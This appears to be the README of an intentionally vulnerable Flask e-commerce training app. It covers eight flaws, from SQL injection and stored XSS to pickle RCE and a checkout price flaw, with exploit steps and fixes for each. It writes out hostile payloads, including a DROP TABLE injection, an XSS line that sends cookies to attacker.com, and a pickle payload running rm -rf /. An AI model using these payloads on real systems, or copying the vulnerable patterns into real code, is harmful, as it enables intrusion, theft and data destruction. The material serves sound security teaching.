# 🚨 Vulnerable E-Commerce Website

**Educational Security Demonstration Platform**

A fully functional, intentionally vulnerable e-commerce website built to teach security concepts through hands-on exploitation and remediation.

---

## 🎯 Overview

This application is a realistic e-commerce platform with **8 intentional security vulnerabilities** across OWASP Top 10 categories. Designed for security professionals, developers, and students to learn how vulnerabilities work and how to fix them.

**Perfect for:**
- Security training and education
- Penetration testing practice
- Portfolio demonstration
- Code review learning
- Security awareness training

---

## ⚠️ Important

**Educational Use Only**
- Do not deploy to production
- Only use on authorized systems
- This is intentionally vulnerable
- Use as a learning tool only

---

## 🚀 Quick Start

### Option 1: Docker Compose (Recommended) ⭐

**Fastest way - one command!**

```bash
docker-compose up
```

That's it! Open: **http://localhost:5000**

### Option 2: Local Python

```bash
# Install dependencies
pip install Flask==2.3.2 Werkzeug==2.3.6

# Run app
python3 app.py
```

Open: **http://localhost:5000**

---

## 🐳 Docker Setup Guide

### Prerequisites

- Docker installed
- Docker Compose installed
- The `app2-vulnerable/` directory

### Quick Docker Setup (3 Steps)

#### Step 1: Create Dockerfile

In your `app2-vulnerable/` directory, create a file named `Dockerfile`:

```dockerfile
FROM python:3.11-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

EXPOSE 5000

CMD ["python3", "app.py"]
```

#### Step 2: Create docker-compose.yml

In your `app2-vulnerable/` directory, create a file named `docker-compose.yml`:

```yaml
version: '3.8'

services:
  web:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: vulnerable-ecommerce
    ports:
      - "5000:5000"
    environment:
      - FLASK_APP=app.py
      - FLASK_ENV=development
      - FLASK_DEBUG=1
    volumes:
      - .:/app
    command: python3 app.py
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:5000"]
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 10s

networks:
  default:
    name: vulnerable-network
```

#### Step 3: Start Docker Compose

```bash
cd app2-vulnerable
docker-compose up
```

You should see:

```
🚨 VULNERABLE E-COMMERCE APP
🌐 Open: http://localhost:5000
💡 Demo: admin@example.com / admin123
```

Then open your browser: **http://localhost:5000** 🎉

---

### Docker Compose Commands

```bash
# Start containers
docker-compose up

# Start in background
docker-compose up -d

# Rebuild after code changes
docker-compose up --build

# View running containers
docker-compose ps

# View logs
docker-compose logs -f web

# Stop containers
docker-compose down

# Stop and remove volumes
docker-compose down -v

# Restart service
docker-compose restart web

# Execute command in container
docker-compose exec web python3 app.py
```

---

### Important: Flask Configuration

**Your `app.py` MUST have this at the bottom:**

```python
if __name__ == '__main__':
    # ⚠️ host='0.0.0.0' is REQUIRED for Docker!
    app.run(debug=True, port=5000, host='0.0.0.0')
```

Without `host='0.0.0.0'`, Docker won't be able to reach Flask!

---

### Troubleshooting Docker

**Problem: Connection refused**
- **Solution:** Make sure app.py has `host='0.0.0.0'`

**Problem: Port 5000 already in use**
- **Solution:** Change in docker-compose.yml:
  ```yaml
  ports:
    - "5001:5000"  # Use 5001 instead
  ```

**Problem: Container won't start**
- **Solution:** Check logs:
  ```bash
  docker-compose logs web
  ```

**Problem: Need to rebuild**
- **Solution:**
  ```bash
  docker-compose down
  docker system prune -f
  docker-compose up --build
  ```

---

## 💡 Demo Credentials

```
Email: admin@example.com
Password: admin123
```

Or register your own account!

---

## 🚨 The 8 Vulnerabilities

### 1. SQL Injection 💉

**CVSS: 9.8 (Critical)**

**Location:** Search functionality (`/search`)

**What it does:**
- User input directly concatenated into SQL query
- No parameterization
- Allows SQL commands to be injected

**How to exploit:**
```
Go to: /search?q=' OR '1'='1
```

**What happens:**
- Query becomes: `SELECT * FROM products WHERE name LIKE '%' OR '1'='1'%'`
- Returns all products (bypasses search logic)

**Real attack:**
```
/search?q='; DROP TABLE products; --
```
Would delete entire products table!

**The fix:**
```python
# VULNERABLE ❌
db.execute(f"SELECT * FROM products WHERE name LIKE '%{query}%'")

# FIXED ✅
db.execute("SELECT * FROM products WHERE name LIKE ?", [f'%{query}%'])
```

---

### 2. Cross-Site Scripting (XSS) 🔗

**CVSS: 8.2 (High)**

**Location:** Product comments (`/product/<id>`)

**What it does:**
- Comments stored without HTML encoding
- JavaScript executes in user's browser
- Session hijacking possible

**How to exploit:**
1. Go to any product page (e.g., `/product/1`)
2. Post comment: 
```html
<img src=x onerror="alert('XSS')">
```
3. JavaScript alert appears!

**Real attack:**
```javascript
<img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
```
Steals user's session cookie and sends to attacker!

**The fix:**
```python
# VULNERABLE ❌
return f"<p>{comment['text']}</p>"

# FIXED ✅
import html
return f"<p>{html.escape(comment['text'])}</p>"
```

---

### 3. Insecure Deserialization (RCE) 🎯

**CVSS: 9.8 (Critical)**

**Location:** Shopping cart (`/cart`)

**What it does:**
- Uses Python `pickle` to serialize cart data
- Pickle can execute arbitrary code
- Remote Code Execution (RCE) possible

**How to exploit:**
1. Add items to cart
2. Check cookies (F12 → Application → Cookies)
3. See `cart` cookie with pickled data

**Real attack:**
```python
import pickle
import subprocess

class RCE:
    def __reduce__(self):
        return (subprocess.Popen, (('rm', '-rf', '/'),))

payload = pickle.dumps(RCE())
# Send as cart cookie → server deleted!
```

**The fix:**
```python
# VULNERABLE ❌
import pickle
cart = pickle.loads(cart_data)

# FIXED ✅
import json
cart = json.loads(cart_data)  # Can't execute code in JSON
```

---

### 4. Hardcoded Secrets 🔑

**CVSS: 8.1 (Critical)**

**Location:** Source code (`app.py`)

**What it does:**
- Database passwords hardcoded
- API keys in code
- Secret keys visible in source

**How to exploit:**
1. Go to: `/admin/show_secrets`
2. See all secrets exposed:
   - `SECRET_KEY: super-secret-key-do-not-share`
   - `DATABASE_PASSWORD: admin123`
   - `API_KEY: sk_live_1234567890abcdef`

**Real attack:**
- Code leaked on GitHub
- Attacker gets all credentials
- Direct database access
- API abuse

**The fix:**
```python
# VULNERABLE ❌
SECRET_KEY = "super-secret-key-do-not-share"

# FIXED ✅
import os
SECRET_KEY = os.getenv("SECRET_KEY")  # From environment variable

# .env file (never committed to git)
SECRET_KEY=your-secret-here
```

---

### 5. Missing Authentication ❌

**CVSS: 9.1 (Critical)**

**Location:** Admin panel (`/admin`)

**What it does:**
- No login required for admin functions
- Anyone can access admin panel
- View users, delete users, modify data

**How to exploit:**
1. Go to: `/admin` (no login!)
2. See all users
3. See admin functions

**Real attack:**
- Delete all users
- Modify user data
- Delete products
- System takeover

**The fix:**
```python
# VULNERABLE ❌
@app.route('/admin')
def admin_panel():
    return render_template('admin.html', users=users)

# FIXED ✅
from functools import wraps

def require_login(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user' not in session:
            return "Unauthorized", 403
        return f(*args, **kwargs)
    return decorated

@app.route('/admin')
@require_login  # Now requires login!
def admin_panel():
    return render_template('admin.html', users=users)
```

---

### 6. Plaintext Passwords 🔓

**CVSS: 9.1 (Critical)**

**Location:** User database

**What it does:**
- Passwords stored in plaintext
- No hashing
- If database leaked, all passwords exposed

**How to exploit:**
1. Go to: `/admin/show_passwords`
2. See all user passwords in plain text:
   - `admin@example.com: admin123`
   - `user@example.com: password123`

**Real attack:**
- Database breach → all passwords stolen
- Users reuse passwords
- Attacker logs into email, bank, social media

**The fix:**
```python
# VULNERABLE ❌
users.append({
    "email": email,
    "password": password  # PLAINTEXT!
})

# FIXED ✅
from passlib.context import CryptContext
pwd_context = CryptContext(schemes=["bcrypt"])

users.append({
    "email": email,
    "password_hash": pwd_context.hash(password)  # HASHED!
})

# Login
if pwd_context.verify(password, user['password_hash']):
    # User authenticated
```

---

### 7. Business Logic Flaw 💰

**CVSS: 6.5 (Medium)**

**Location:** Checkout (`/checkout`)

**What it does:**
- Accepts price from client input
- No validation
- Customer can set any price

**How to exploit:**
1. Go to: `/checkout`
2. Fill in:
   - Product ID: 1
   - Quantity: 1
   - **Price: -999999**
3. Click checkout

**What happens:**
- Customer receives $999,999 instead of paying!
- Business loses money on every transaction

**Real attack:**
```bash
curl -X POST http://localhost:5000/checkout \
  -d "product_id=1&quantity=1&price=-999999"
```
Customer paid negative = customer receives money!

**The fix:**
```python
# VULNERABLE ❌
price = float(request.form['price'])  # Trust client!
charge_customer(price)

# FIXED ✅
product = Product.query.get(product_id)
actual_price = product.price  # From database!

if actual_price < 0 or actual_price > 100000:
    return "Invalid price", 400

total = actual_price * quantity
charge_customer(total)
```

---

### 8. Missing Security Headers 🚫

**CVSS: 6.5 (Medium)**

**Location:** All pages

**What it does:**
- No security headers set
- Browser doesn't know how to protect
- Vulnerable to MIME sniffing, clickjacking, etc.

**How to check:**
1. Open DevTools: F12
2. Go to Network tab
3. Click any request
4. Look at Response Headers
5. Notice: **No security headers!**

**Real attacks:**
- MIME sniffing: Browser guesses content type
- Clickjacking: Page framed in malicious site
- XSS: No CSP to block scripts
- Man-in-the-middle: No HSTS

**The fix:**
```python
# VULNERABLE ❌
@app.route('/')
def index():
    return render_template('index.html')

# FIXED ✅
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

---

## 📊 Vulnerability Summary

| # | Vulnerability | Severity | CVSS | Test Link | Impact |
|---|---|---|---|---|---|
| 1 | SQL Injection | 🔴 CRITICAL | 9.8 | `/search?q=' OR '1'='1` | Data theft, deletion, modification |
| 2 | XSS | 🟠 HIGH | 8.2 | `/product/1` (add comment) | Session hijacking, malware |
| 3 | RCE | 🔴 CRITICAL | 9.8 | `/cart` (pickle) | Full server compromise |
| 4 | Hardcoded Secrets | 🔴 CRITICAL | 8.1 | `/admin/show_secrets` | Database/API access |
| 5 | Missing Auth | 🔴 CRITICAL | 9.1 | `/admin` | Admin access without login |
| 6 | Plaintext Passwords | 🔴 CRITICAL | 9.1 | `/admin/show_passwords` | Account takeover |
| 7 | Logic Flaw | 🟡 MEDIUM | 6.5 | `/checkout` (price: -999999) | Financial loss |
| 8 | Missing Headers | 🟡 MEDIUM | 6.5 | F12 Network tab | Multiple attack vectors |

**Overall Risk: 🔴 CRITICAL**

---

## 🗂️ Project Structure

```
app2-vulnerable/
├── app.py                    # Flask application (all vulnerabilities)
├── requirements.txt          # Python dependencies
├── Dockerfile                # Container definition
├── docker-compose.yml        # Docker Compose setup
├── README.md                 # This file
└── templates/
    ├── base.html            # Base template with header/footer
    ├── index.html           # Homepage with product listing
    ├── products.html        # All products page
    ├── product.html         # Single product (XSS vulnerable)
    ├── search.html          # Search results (SQL injection)
    ├── cart.html            # Shopping cart (pickle RCE)
    ├── checkout.html        # Checkout (logic flaw)
    ├── login.html           # Login page
    ├── register.html        # Registration page
    ├── admin.html           # Admin panel (no auth)
    ├── admin_passwords.html # Plaintext passwords
    └── admin_secrets.html   # Hardcoded secrets
```

---

## 💻 Tech Stack

- **Backend:** Flask 2.3.2 (Python web framework)
- **Frontend:** Jinja2 templates, vanilla HTML/CSS
- **Database:** In-memory (Python lists)
- **Container:** Docker & Docker Compose
- **Python Version:** 3.11

---

## 📚 Learning Path

### Beginner
1. Start at homepage
2. Try to find all 8 vulnerabilities
3. Read explanations
4. Understand the impact

### Intermediate
1. Look at source code (app.py)
2. See how vulnerabilities are implemented
3. Understand why they're vulnerable
4. Think about fixes

### Advanced
1. Create hardened version
2. Implement fixes
3. Compare vulnerable vs secure code
4. Build your own vulnerable app
5. Use for penetration testing practice

---

## 🧪 Testing Each Vulnerability

### Test 1: SQL Injection
```
URL: /search?q=' OR '1'='1
Expected: Alert shown, vulnerability detected
```

### Test 2: XSS
```
1. Go to /product/1
2. Add comment: <img src=x onerror="alert('XSS')">
3. Expected: Alert shows, XSS detected
```

### Test 3: Missing Authentication
```
1. Don't log in
2. Go to /admin
3. Expected: See all users (no login required!)
```

### Test 4: Plaintext Passwords
```
1. Visit /admin/show_passwords
2. Expected: See passwords in plain text
```

### Test 5: Hardcoded Secrets
```
1. Visit /admin/show_secrets
2. Expected: See DATABASE_PASSWORD, API_KEY, etc.
```

### Test 6: Business Logic
```
1. Go to /checkout
2. Set price: -999999
3. Click checkout
4. Expected: Alert shows logic flaw
```

### Test 7: Pickle RCE
```
1. Add items to cart
2. Check F12 → Application → Cookies
3. Expected: See pickled cart data
```

### Test 8: Missing Headers
```
1. Open F12 → Network
2. Click any request
3. Check Response Headers
4. Expected: No X-Content-Type-Options, CSP, HSTS, etc.
```

---

## 🔒 Security Notes

**This app is INTENTIONALLY vulnerable!**

- ✅ Great for learning
- ✅ Perfect for demos
- ✅ Ideal for security training
- ❌ **Never deploy to production**
- ❌ **Only use in controlled environments**
- ❌ **Use authorized systems only**

---

## 📖 Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Top 10 API Security](https://owasp.org/www-project-api-security/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-502: Deserialization](https://cwe.mitre.org/data/definitions/502.html)

---

## 🎓 For Security Professionals

**Use this to:**
- Train developers on security concepts
- Demonstrate vulnerability impact
- Practice exploitation techniques
- Improve code review skills
- Build security awareness
- Create security training materials

---

## 🚀 Next Steps

1. **Understand each vulnerability** - Read explanations
2. **Exploit them** - Use test cases
3. **Create fixes** - Implement secure versions
4. **Compare** - Vulnerable vs Hardened code
5. **Apply** - Use knowledge in real projects

---

## 📞 Questions?

If you have questions about any vulnerability:

1. **Look at the code** - app.py shows exactly how it's vulnerable
2. **Read the fix** - Each vulnerability includes the solution
3. **Test it** - Try exploiting it yourself
4. **Learn why** - Understand the security principle

---

## ⚖️ License

Educational use only. Use at your own risk on authorized systems.

---

**Happy learning! 🛡️**